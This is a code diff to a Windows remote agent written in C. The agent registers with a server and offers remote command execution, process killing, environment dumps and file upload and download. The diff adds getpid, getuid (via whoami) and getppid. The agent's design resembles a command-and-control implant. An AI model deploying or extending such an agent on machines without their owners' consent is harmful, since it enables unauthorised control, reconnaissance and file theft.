@@ -53,6 +53,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
+#include <tlhelp32.h>
 #include <security.h>
 #include <schannel.h>
 #include <wincrypt.h>
@@ -1221,7 +1222,7 @@ static int handle_register(SOCKET s) {
              "\"os\":\"windows\",\"arch\":\"x64\",\"username\":\"%s\","
              "\"agent_version\":\"%s\","
              "\"capabilities\":[\"exec\",\"ping\",\"sysinfo\",\"processes\","
-             "\"network\",\"netstat\",\"process_kill\",\"pwd\",\"get_hwuuid\",\"env\",\"date\",\"alive\",\"fs_list\",\"fs_get\",\"fs_put\",\"shutdown\"],"
+             "\"network\",\"netstat\",\"process_kill\",\"pwd\",\"get_hwuuid\",\"env\",\"date\",\"alive\",\"getpid\",\"getuid\",\"getppid\",\"fs_list\",\"fs_get\",\"fs_put\",\"shutdown\"],"
              "\"max_line\":%d}",
              escaped_auth, escaped_host, escaped_user, g_agent_version,
              RECV_BUF_SIZE);
@@ -1791,6 +1792,7 @@ static const char *shell_for(const char *action) {
     if (!strcmp(action, "network")) return "ipconfig /all";
     if (!strcmp(action, "env")) return "set";   /* cmd prints the environment */
     if (!strcmp(action, "date")) return "date /t & time /t";
+    if (!strcmp(action, "getuid")) return "whoami";
     if (!strcmp(action, "netstat")) return "netstat -ano";
     if (!strcmp(action, "pwd")) return "cd";   /* cmd prints the cwd */
     /* wmic is deprecated on modern Windows; reg query works everywhere. */
@@ -1804,6 +1806,37 @@ static int handle_action(SOCKET s, const char *task, const char *action, const c
         return send_literal(s, cmd_id, "{\"pong\":true}");
     if (!strcmp(action, "alive"))
         return send_literal(s, cmd_id, "{\"alive\":true}");
+
+    /* Nothing in cmd yields the agent's OWN pid -- `powershell -c $PID`
+     * returns PowerShell's -- so these two are answered natively. */
+    if (!strcmp(action, "getpid")) {
+        char pidbuf[64];
+        int n = snprintf(pidbuf, sizeof(pidbuf), "{\"pid\":%lu}",
+                         (unsigned long)GetCurrentProcessId());
+        return send_result(s, cmd_id, pidbuf, (size_t)n);
+    }
+    if (!strcmp(action, "getppid")) {
+        unsigned long parent = 0;
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe;
+            ZeroMemory(&pe, sizeof(pe));
+            pe.dwSize = sizeof(pe);
+            DWORD self = GetCurrentProcessId();
+            if (Process32First(snap, &pe)) {
+                do {
+                    if (pe.th32ProcessID == self) {
+                        parent = pe.th32ParentProcessID;
+                        break;
+                    }
+                } while (Process32Next(snap, &pe));
+            }
+            CloseHandle(snap);
+        }
+        char ppbuf[64];
+        int n = snprintf(ppbuf, sizeof(ppbuf), "{\"ppid\":%lu}", parent);
+        return send_result(s, cmd_id, ppbuf, (size_t)n);
+    }
     if (!strcmp(action, "fs_list")) return task_fs_list(s, task, cmd_id);
     if (!strcmp(action, "fs_get")) return task_fs_get(s, task, cmd_id);
     if (!strcmp(action, "fs_put")) return task_fs_put(s, task, cmd_id);
@@ -1876,6 +1909,9 @@ static const char *bare_verb_action(const char *line) {
     if (!strcmp(word, "env")) return "env";
     if (!strcmp(word, "date")) return "date";
     if (!strcmp(word, "alive")) return "alive";
+    if (!strcmp(word, "getpid")) return "getpid";
+    if (!strcmp(word, "getuid")) return "getuid";
+    if (!strcmp(word, "getppid")) return "getppid";
     if (!strcmp(word, "ps") || !strcmp(word, "processes")) return "processes";
     if (!strcmp(word, "fs_list")) return "fs_list";
     if (!strcmp(word, "exit") || !strcmp(word, "shutdown")) return "shutdown";
